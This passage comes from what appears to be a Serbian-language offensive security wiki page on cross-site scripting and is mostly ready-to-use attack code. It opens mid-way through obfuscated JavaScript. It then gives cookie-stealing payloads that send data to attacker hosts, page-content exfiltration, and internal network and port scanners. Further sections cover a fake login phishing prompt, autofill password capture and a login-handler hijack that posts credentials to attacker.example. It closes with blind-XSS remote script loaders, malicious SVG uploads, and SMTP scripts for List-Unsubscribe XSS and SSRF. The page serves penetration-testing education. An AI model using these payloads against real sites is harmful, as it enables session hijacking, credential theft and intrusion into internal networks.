ﾟДﾟ[ﾟεﾟ] +
ﾟｰﾟ +
((o ^ _ ^ o) - ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟΘﾟ +
(c ^ _ ^ o) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟｰﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟｰﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟｰﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
(ﾟｰﾟ + (o ^ _ ^ o)) +
ﾟДﾟ[ﾟεﾟ] +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟｰﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟｰﾟ +
(c ^ _ ^ o) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟΘﾟ +
((o ^ _ ^ o) - ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟｰﾟ +
ﾟΘﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟｰﾟ +
ﾟΘﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) - ﾟΘﾟ) +
(o ^ _ ^ o) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟｰﾟ +
(o ^ _ ^ o) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
((o ^ _ ^ o) - ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟΘﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
(c ^ _ ^ o) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
ﾟｰﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟｰﾟ +
((o ^ _ ^ o) - ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟΘﾟ +
ﾟДﾟ[ﾟoﾟ]
)(ﾟΘﾟ)
)("_")
```

```javascript
// It's also possible to execute JS code only with the chars: []`+!${}
```
## XSS common payloads

### Several payloads in 1


{{#ref}}
steal-info-js.md
{{#endref}}

### Iframe Trap

Naterajte korisnika da ostane unutar iframe-a dok pregleda stranicu i presretnete njegove akcije (uključujući podatke poslate u formularima):


{{#ref}}
../iframe-traps.md
{{#endref}}

### Retrieve Cookies
```javascript
<img src=x onerror=this.src="http://<YOUR_SERVER_IP>/?c="+document.cookie>
<img src=x onerror="location.href='http://<YOUR_SERVER_IP>/?c='+ document.cookie">
<script>new Image().src="http://<IP>/?c="+encodeURI(document.cookie);</script>
<script>new Audio().src="http://<IP>/?c="+escape(document.cookie);</script>
<script>location.href = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
<script>location = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
<script>document.location = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
<script>document.location.href = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
<script>document.write('<img src="http://<YOUR_SERVER_IP>?c='+document.cookie+'" />')</script>
<script>window.location.assign('http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie)</script>
<script>window['location']['assign']('http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie)</script>
<script>window['location']['href']('http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie)</script>
<script>document.location=["http://<YOUR_SERVER_IP>?c",document.cookie].join()</script>
<script>var i=new Image();i.src="http://<YOUR_SERVER_IP>/?c="+document.cookie</script>
<script>window.location="https://<SERVER_IP>/?c=".concat(document.cookie)</script>
<script>var xhttp=new XMLHttpRequest();xhttp.open("GET", "http://<SERVER_IP>/?c="%2Bdocument.cookie, true);xhttp.send();</script>
<script>eval(atob('ZG9jdW1lbnQud3JpdGUoIjxpbWcgc3JjPSdodHRwczovLzxTRVJWRVJfSVA+P2M9IisgZG9jdW1lbnQuY29va2llICsiJyAvPiIp'));</script>
<script>fetch('https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net', {method: 'POST', mode: 'no-cors', body:document.cookie});</script>
<script>navigator.sendBeacon('https://ssrftest.com/x/AAAAA',document.cookie)</script>
```
> [!TIP]
> **Nećete moći da pristupite cookies iz JavaScript-a** ako je HTTPOnly flag postavljen u cookie. Ali ovde imate [neke načine da zaobiđete ovu zaštitu](../hacking-with-cookies/index.html#httponly) ako ste dovoljno srećni.

### Krađa sadržaja stranice
```javascript
var url = "http://10.10.10.25:8000/vac/a1fbf2d1-7c3f-48d2-b0c3-a205e54e09e8"
var attacker = "http://10.10.14.8/exfil"
var xhr = new XMLHttpRequest()
xhr.onreadystatechange = function () {
if (xhr.readyState == XMLHttpRequest.DONE) {
fetch(attacker + "?" + encodeURI(btoa(xhr.responseText)))
}
}
xhr.open("GET", url, true)
xhr.send(null)
```
### Pronađite interne IP adrese
```html
<script>
var q = []
var collaboratorURL =
"http://5ntrut4mpce548i2yppn9jk1fsli97.burpcollaborator.net"
var wait = 2000
var n_threads = 51

// Prepare the fetchUrl functions to access all the possible
for (i = 1; i <= 255; i++) {
q.push(
(function (url) {
return function () {
fetchUrl(url, wait)
}
})("http://192.168.0." + i + ":8080")
)
}

// Launch n_threads threads that are going to be calling fetchUrl until there is no more functions in q
for (i = 1; i <= n_threads; i++) {
if (q.length) q.shift()()
}

function fetchUrl(url, wait) {
console.log(url)
var controller = new AbortController(),
signal = controller.signal
fetch(url, { signal })
.then((r) =>
r.text().then((text) => {
location =
collaboratorURL +
"?ip=" +
url.replace(/^http:\/\//, "") +
"&code=" +
encodeURIComponent(text) +
"&" +
Date.now()
})
)
.catch((e) => {
if (!String(e).includes("The user aborted a request") && q.length) {
q.shift()()
}
})

setTimeout((x) => {
controller.abort()
if (q.length) {
q.shift()()
}
}, wait)
}
</script>
```
### Port Scanner (fetch)
```javascript
const checkPort = (port) => { fetch(http://localhost:${port}, { mode: "no-cors" }).then(() => { let img = document.createElement("img"); img.src = http://attacker.com/ping?port=${port}; }); } for(let i=0; i<1000; i++) { checkPort(i); }
```
### Port Scanner (websockets)
```python
var ports = [80, 443, 445, 554, 3306, 3690, 1234];
for(var i=0; i<ports.length; i++) {
var s = new WebSocket("wss://192.168.1.1:" + ports[i]);
s.start = performance.now();
s.port = ports[i];
s.onerror = function() {
console.log("Port " + this.port + ": " + (performance.now() -this.start) + " ms");
};
s.onopen = function() {
console.log("Port " + this.port+ ": " + (performance.now() -this.start) + " ms");
};
}
```
_Kratka vremena ukazuju na port koji odgovara_ _Duže ukazuju na odsustvo odgovora._

Pregledajte listu portova zabranjenih u Chrome [**ovde**](https://src.chromium.org/viewvc/chrome/trunk/src/net/base/net_util.cc) i u Firefox [**ovde**](https://www-archive.mozilla.org/projects/netlib/portbanning#portlist).

### Polje za traženje kredencijala
```html
<style>::placeholder { color:white; }</style><script>document.write("<div style='position:absolute;top:100px;left:250px;width:400px;background-color:white;height:230px;padding:15px;border-radius:10px;color:black'><form action='https://example.com/'><p>Your sesion has timed out, please login again:</p><input style='width:100%;' type='text' placeholder='Username' /><input style='width: 100%' type='password' placeholder='Password'/><input type='submit' value='Login'></form><p><i>This login box is presented using XSS as a proof-of-concept</i></p></div>")</script>
```
### Presretanje lozinki iz automatskog popunjavanja
```javascript
<b>Username:</><br>
<input name=username id=username>
<b>Password:</><br>
<input type=password name=password onchange="if(this.value.length)fetch('https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
```
Kada se bilo koji podaci unesu u polje password, username i password se šalju na attackers server; čak i ako klijent izabere saved password i ništa ne unese, credentials će biti ex-filtrated.

### Hijack form handlers to exfiltrate credentials (const shadowing)

Ako je kritični handler (npr. `function DoLogin(){...}`) deklarisan kasnije na stranici, a tvoj payload se izvršava ranije (npr. putem inline JS-in-JS sink), definiši `const` istog imena prvo da preempt-uješ i zaključaš handler. Kasnije deklaracije funkcija ne mogu rebind-ovati `const` ime, ostavljajući tvoj hook pod kontrolom:
```javascript
const DoLogin = () => {
const pwd  = Trim(FormInput.InputPassword.value);
const user = Trim(FormInput.InputUtente.value);
fetch('https://attacker.example/?u='+encodeURIComponent(user)+'&p='+encodeURIComponent(pwd));
};
```
Napomene
- Ovo zavisi od execution order: vaš injection mora da se izvrši pre legitimne deklaracije.
- Ako je vaš payload umotan u `eval(...)`, `const/let` bindings neće postati globals. Koristite dinamičku `<script>` injection tehniku iz sekcije “Deliverable payloads with eval(atob()) and scope nuances” da obezbedite pravi global, non-rebindable binding.
- Kada keyword filters blokiraju kod, kombinujte sa Unicode-escaped identifiers ili `eval(atob('...'))` delivery, kao što je prikazano gore.

### Keylogger

Samo pretragom na github našao sam nekoliko različitih:

- https://github.com/JohnHoder/Javascript-Keylogger
- https://github.com/rajeshmajumdar/keylogger
- https://github.com/hakanonymos/JavascriptKeylogger
- Takođe možete koristiti metasploit `http_javascript_keylogger`

### Stealing CSRF tokens
```javascript
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/email',true);
req.send();
function handleResponse() {
var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
var changeReq = new XMLHttpRequest();
changeReq.open('post', '/email/change-email', true);
changeReq.send('csrf='+token+'&email=test@test.com')
};
</script>
```
### Krađa PostMessage poruka
```html
<img src="https://attacker.com/?" id=message>
<script>
window.onmessage = function(e){
document.getElementById("message").src += "&"+e.data;
</script>
```
### Zloupotreba Service Workers


{{#ref}}
abusing-service-workers.md
{{#endref}}

### Pristup Shadow DOM


{{#ref}}
shadow-dom.md
{{#endref}}

### Polyglots


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/xss_polyglots.txt
{{#endref}}

### Blind XSS payloads

Takođe možete koristiti: [https://xsshunter.com/](https://xsshunter.com)
```html
"><img src='//domain/xss'>
"><script src="//domain/xss.js"></script>
><a href="javascript:eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')">Click Me For An Awesome Time</a>
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//0mnb1tlfl5x4u55yfb57dmwsajgd42.burpcollaborator.net/scriptb");a.send();</script>

<!-- html5sec - Self-executing focus event via autofocus: -->
"><input onfocus="eval('d=document; _ = d.createElement(\'script\');_.src=\'\/\/domain/m\';d.body.appendChild(_)')" autofocus>

<!-- html5sec - JavaScript execution via iframe and onload -->
"><iframe onload="eval('d=document; _=d.createElement(\'script\');_.src=\'\/\/domain/m\';d.body.appendChild(_)')">

<!-- html5sec - SVG tags allow code to be executed with onload without any other elements. -->
"><svg onload="javascript:eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')" xmlns="http://www.w3.org/2000/svg"></svg>

<!-- html5sec -  allow error handlers in <SOURCE> tags if encapsulated by a <VIDEO> tag. The same works for <AUDIO> tags  -->
"><video><source onerror="eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')">

<!--  html5sec - eventhandler -  element fires an "onpageshow" event without user interaction on all modern browsers. This can be abused to bypass blacklists as the event is not very well known.  -->
"><body onpageshow="eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')">

<!-- xsshunter.com - Sites that use JQuery -->
<script>$.getScript("//domain")</script>

<!-- xsshunter.com - When <script> is filtered -->
"><img src=x id=payload&#61;&#61; onerror=eval(atob(this.id))>

<!-- xsshunter.com - Bypassing poorly designed systems with autofocus -->
"><input onfocus=eval(atob(this.id)) id=payload&#61;&#61; autofocus>

<!-- noscript trick -->
<noscript><p title="</noscript><img src=x onerror=alert(1)>">

<!-- whitelisted CDNs in CSP -->
"><script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.1/angular.js"></script>
<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.1/angular.min.js"></script>
<!-- ... add more CDNs, you'll get WARNING: Tried to load angular more than once if multiple load. but that does not matter you'll get a HTTP interaction/exfiltration :-]... -->
<div ng-app ng-csp><textarea autofocus ng-focus="d=$event.view.document;d.location.hash.match('x1') ? '' : d.location='//localhost/mH/'"></textarea></div>

<!-- Payloads from https://www.intigriti.com/researchers/blog/hacking-tools/hunting-for-blind-cross-site-scripting-xss-vulnerabilities-a-complete-guide -->
<!-- Image tag -->
'"><img src="x" onerror="eval(atob(this.id))" id="Y29uc3QgeD1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTt4LnNyYz0ne1NFUlZFUn0vc2NyaXB0LmpzJztkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHgpOw==">

<!-- Input tag with autofocus -->
'"><input autofocus onfocus="eval(atob(this.id))" id="Y29uc3QgeD1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTt4LnNyYz0ne1NFUlZFUn0vc2NyaXB0LmpzJztkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHgpOw==">

<!-- In case jQuery is loaded, we can make use of the getScript method -->
'"><script>$.getScript("{SERVER}/script.js")</script>

<!-- Make use of the JavaScript protocol (applicable in cases where your input lands into the "href" attribute or a specific DOM sink) -->
javascript:eval(atob("Y29uc3QgeD1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTt4LnNyYz0ne1NFUlZFUn0vc2NyaXB0LmpzJztkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHgpOw=="))

<!-- Render an iframe to validate your injection point and receive a callback -->
'"><iframe src="{SERVER}"></iframe>

<!-- Bypass certain Content Security Policy (CSP) restrictions with a base tag -->
<base href="{SERVER}" />

<!-- Make use of the meta-tag to initiate a redirect -->
<meta http-equiv="refresh" content="0; url={SERVER}" />

<!-- In case your target makes use of AngularJS -->
{{constructor.constructor("import('{SERVER}/script.js')")()}}
```
### Regex - Pristup skrivenom sadržaju

Iz [**this writeup**](https://blog.arkark.dev/2022/11/18/seccon-en/#web-piyosay) može se zaključiti da čak i ako neke vrednosti nestanu iz JS, i dalje ih je moguće pronaći u JS atributima različitih objekata. Na primer, input REGEX-a se i dalje može pronaći i nakon što je vrednost tog inputa uklonjena:
```javascript
// Do regex with flag
flag = "CTF{FLAG}"
re = /./g
re.test(flag)

// Remove flag value, nobody will be able to get it, right?
flag = ""

// Access previous regex input
console.log(RegExp.input)
console.log(RegExp.rightContext)
console.log(
document.all["0"]["ownerDocument"]["defaultView"]["RegExp"]["rightContext"]
)
```
### Brute-Force List


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/xss.txt
{{#endref}}

## XSS — zloupotreba drugih ranjivosti

### XSS u Markdown

Možeš ubaciti Markdown kod koji će biti renderovan? Možda možeš dobiti XSS! Proveri:


{{#ref}}
xss-in-markdown.md
{{#endref}}

### XSS u SSRF

Imaš XSS na **sajtu koji koristi caching**? Pokušaj to **eskalirati u SSRF** kroz Edge Side Include Injection sa ovim payloadom:
```python
<esi:include src="http://yoursite.com/capture" />
```
Koristite ga da zaobiđete cookie restrictions, XSS filtere i još mnogo toga!\
Više informacija o ovoj tehnici ovde: [**XSLT**](../xslt-server-side-injection-extensible-stylesheet-language-transformations.md).

### XSS u dinamički kreiranom PDF-u

Ako web stranica pravi PDF koristeći input koji kontroliše korisnik, možete pokušati da **prevarite bot** koji kreira PDF kako bi **izvršio proizvoljan JS kod**.\
Dakle, ako **PDF creator bot pronađe** neki tip **HTML** **tagova**, on će ih **interpretirati**, i možete **iskoristiti** ovo ponašanje da izazovete **Server XSS**.


{{#ref}}
server-side-xss-dynamic-pdf.md
{{#endref}}

Ako ne možete da injektujete **HTML** tagove, može biti vredno pokušati da **inject PDF data**:


{{#ref}}
pdf-injection.md
{{#endref}}

### XSS u Amp4Email

AMP, čiji je cilj ubrzanje performansi web stranica na mobilnim uređajima, koristi **HTML** tagove dopunjene **JavaScript**-om kako bi obezbedio funkcionalnost sa naglaskom na brzinu i bezbednost. Podržava niz komponenti za razne funkcije, dostupnih preko [AMP components](https://amp.dev/documentation/components/?format=websites).

The [**AMP for Email**](https://amp.dev/documentation/guides-and-tutorials/learn/email-spec/amp-email-format/) format proširuje određene AMP komponente za email-ove, omogućavajući primaocima da interaguju sa sadržajem direktno u svojim email-ovima.

Example [**writeup XSS in Amp4Email in Gmail**](https://adico.me/post/xss-in-gmail-s-amp4email).

### List-Unsubscribe Header Abuse (Webmail XSS & SSRF)

RFC 2369 `List-Unsubscribe` header ugrađuje attacker-controlled URIs koje mnogi webmail i mail klijenti automatski pretvaraju u "Unsubscribe" dugmad. Kada se ti URI renderuju ili dohvaćaju bez validacije, header postaje injekcioni punkt za i stored XSS (ako je unsubscribe link postavljen u DOM) i SSRF (ako server izvršava unsubscribe zahtev u ime korisnika).

#### Stored XSS via `javascript:` URIs

1. **Send yourself an email** where the header points to a `javascript:` URI while keeping the rest of the message benign so that spam filters do not drop it.
2. **Ensure the UI renders the value** (many clients show it in a "List Info" pane) and check whether the resulting `<a>` tag inherits attacker-controlled attributes such as `href` or `target`.
3. **Trigger execution** (e.g., CTRL+click, middle-click, or "open in new tab") when the link uses `target="_blank"`; browsers will evaluate the supplied JavaScript in the origin of the webmail application.
4. Posmatrajte stored-XSS primitive: payload ostaje uz email i za izvršenje je potreban samo klik.
```text
List-Unsubscribe: <javascript://attacker.tld/%0aconfirm(document.domain)>
List-Unsubscribe-Post: List-Unsubscribe=One-Click
```
Bajt novog reda (`%0a`) u URI pokazuje da čak i neobični karakteri prežive proces renderovanja u ranjivim klijentima kao što je Horde IMP H5, koji će ispisati string doslovno unutar anchor taga.

<details>
<summary>Minimalni SMTP PoC koji isporučuje zlonamerni List-Unsubscribe header</summary>
```python
#!/usr/bin/env python3
import smtplib
from email.message import EmailMessage

smtp_server = "mail.example.org"
smtp_port = 587
smtp_user = "user@example.org"
smtp_password = "REDACTED"
sender = "list@example.org"
recipient = "victim@example.org"

msg = EmailMessage()
msg.set_content("Testing List-Unsubscribe rendering")
msg["From"] = sender
msg["To"] = recipient
msg["Subject"] = "Newsletter"
msg["List-Unsubscribe"] = "<javascript://evil.tld/%0aconfirm(document.domain)>"
msg["List-Unsubscribe-Post"] = "List-Unsubscribe=One-Click"

with smtplib.SMTP(smtp_server, smtp_port) as smtp:
smtp.starttls()
smtp.login(smtp_user, smtp_password)
smtp.send_message(msg)
```
</details>

#### Proxy za unsubscribe na strani servera -> SSRF

Neki klijenti, kao što je Nextcloud Mail app, proksi-ju akciju unsubscribe na strani servera: klik na dugme naloži serveru da sam fetch-uje prosleđeni URL. To pretvara header u SSRF primitiv, posebno kada administratori postave 'allow_local_remote_servers' => true (dokumentovano u [HackerOne report 2902856](https://hackerone.com/reports/2902856)), što omogućava zahteve ka loopback i RFC1918 opsezima.

1. **Craft an email** where `List-Unsubscribe` targets an attacker-controlled endpoint (for blind SSRF use Burp Collaborator / OAST).  
2. **Keep `List-Unsubscribe-Post: List-Unsubscribe=One-Click`** so the UI shows a single-click unsubscribe button.  
3. **Satisfy trust requirements**: Nextcloud, na primer, izvršava HTTPS unsubscribe zahteve samo kada poruka prođe DKIM, tako da napadač mora da potpiše email koristeći domen koji kontroliše.  
4. **Deliver the message to a mailbox processed by the target server** i sačekajte da korisnik klikne unsubscribe dugme.  
5. **Observe the server-side callback** at the collaborator endpoint, zatim pivotirajte ka internim adresama kada je primitiv potvrđen.
```text
List-Unsubscribe: <http://abcdef.oastify.com>
List-Unsubscribe-Post: List-Unsubscribe=One-Click
```
<details>
<summary>DKIM-potpisana List-Unsubscribe poruka za testiranje SSRF-a</summary>
```python
#!/usr/bin/env python3
import smtplib
from email.message import EmailMessage
import dkim

smtp_server = "mail.example.org"
smtp_port = 587
smtp_user = "user@example.org"
smtp_password = "REDACTED"
dkim_selector = "default"
dkim_domain = "example.org"
dkim_private_key = """-----BEGIN PRIVATE KEY-----\n...\n-----END PRIVATE KEY-----"""

msg = EmailMessage()
msg.set_content("One-click unsubscribe test")
msg["From"] = "list@example.org"
msg["To"] = "victim@example.org"
msg["Subject"] = "Mailing list"
msg["List-Unsubscribe"] = "<http://abcdef.oastify.com>"
msg["List-Unsubscribe-Post"] = "List-Unsubscribe=One-Click"

raw = msg.as_bytes()
signature = dkim.sign(
message=raw,
selector=dkim_selector.encode(),
domain=dkim_domain.encode(),
privkey=dkim_private_key.encode(),
include_headers=["From", "To", "Subject"]
)
msg["DKIM-Signature"] = signature.decode().split(": ", 1)[1].replace("\r", "").replace("\n", "")

with smtplib.SMTP(smtp_server, smtp_port) as smtp:
smtp.starttls()
smtp.login(smtp_user, smtp_password)
smtp.send_message(msg)
```
</details>

**Napomene za testiranje**

- Koristite OAST endpoint da sakupite blind SSRF hitove, zatim prilagodite `List-Unsubscribe` URL da cilja `http://127.0.0.1:PORT`, metadata services ili druge interne hostove jednom kada se primitiv potvrdi.
- Pošto unsubscribe helper često ponovo koristi isti HTTP stack kao aplikacija, nasledite njegove proxy settings, HTTP verbs i header rewrites, što omogućava dodatne traversal trikove opisane u [SSRF methodology](../ssrf-server-side-request-forgery/README.md).

### XSS otpremanje fajlova (svg)

Otpremite kao sliku fajl poput sledećeg (sa [http://ghostlulz.com/xss-svg/](http://ghostlulz.com/xss-svg/)):
```html
Content-Type: multipart/form-data; boundary=---------------------------232181429808
Content-Length: 574
-----------------------------232181429808
Content-Disposition: form-data; name="img"; filename="img.svg"
Content-Type: image/svg+xml

<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
<rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
<script type="text/javascript">
alert(1);
</script>
</svg>
-----------------------------232181429808--
```

```html
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
<script type="text/javascript">alert("XSS")</script>
</svg>
```

```html
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
<polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
<script type="text/javascript">
alert("XSS");
</script>
</svg>
```

```svg
<svg width="500" height="500"
xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
<circle cx="50" cy="50" r="45" fill="green"
id="foo"/>

<foreignObject width="500" height="500">
<iframe xmlns="http://www.w3.org/1999/xhtml" src="data:text/html,&lt;body&gt;&lt;script&gt;document.body.style.background=&quot;red&quot;&lt;/script&gt;hi&lt;/body&gt;" width="400" height="250"/>
<iframe xmlns="http://www.w3.org/1999/xhtml" src="javascript:document.write('hi');" width="400" height="250"/>
</foreignObject>
</svg>
```

```html
<svg><use href="//portswigger-labs.net/use_element/upload.php#x" /></svg>
```

```xml
<svg><use href="data:image/svg+xml,&lt;svg id='x' xmlns='http://www.w3.org/2000/svg' &gt;&lt;image href='1' onerror='alert(1)' /&gt;&lt;/svg&gt;#x" />
```
Pronađite **više SVG payloads u** [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet)

## Razni JS trikovi i relevantne informacije


{{#ref}}
other-js-tricks.md
{{#endref}}

## XSS resursi

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20injection)
- [http://www.xss-payloads.com](http://www.xss-payloads.com) [https://github.com/Pgaijin66/XSS-Payloads/blob/master/payload.txt](https://github.com/Pgaijin66/XSS-Payloads/blob/master/payload.txt) [https://github.com/materaj/xss-list](https://github.com/materaj/xss-list)
- [https://github.com/ismailtasdelen/xss-payload-list](https://github.com/ismailtasdelen/xss-payload-list)
- [https://gist.github.com/rvrsh3ll/09a8b933291f9f98e8ec](https://gist.github.com/rvrsh3ll/09a8b933291f9f98e8ec)
- [https://netsec.expert/2020/02/01/xss-in-2020.html](https://netsec.expert/2020/02/01/xss-in-2020.html)
- [https://www.intigriti.com/researchers/blog/hacking-tools/hunting-for-blind-cross-site-scripting-xss-vulnerabilities-a-complete-guide](https://www.intigriti.com/researchers/blog/hacking-tools/hunting-for-blind-cross-site-scripting-xss-vulnerabilities-a-complete-guide)

## Izvori

- [Turning a harmless XSS behind a WAF into a realistic phishing vector](https://blog.hackcommander.com/posts/2025/12/28/turning-a-harmless-xss-behind-a-waf-into-a-realistic-phishing-vector/)
- [XSS and SSRF via the List-Unsubscribe SMTP Header in Horde Webmail and Nextcloud Mail](https://security.lauritz-holtmann.de/post/xss-ssrf-list-unsubscribe/)
- [HackerOne Report #2902856 - Nextcloud Mail List-Unsubscribe SSRF](https://hackerone.com/reports/2902856)
- [From "Low-Impact" RXSS to Credential Stealer: A JS-in-JS Walkthrough](https://r3verii.github.io/bugbounty/2025/08/25/rxss-credential-stealer.html)
- [MDN eval()](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval)

{{#include ../../banners/hacktricks-training.md}}
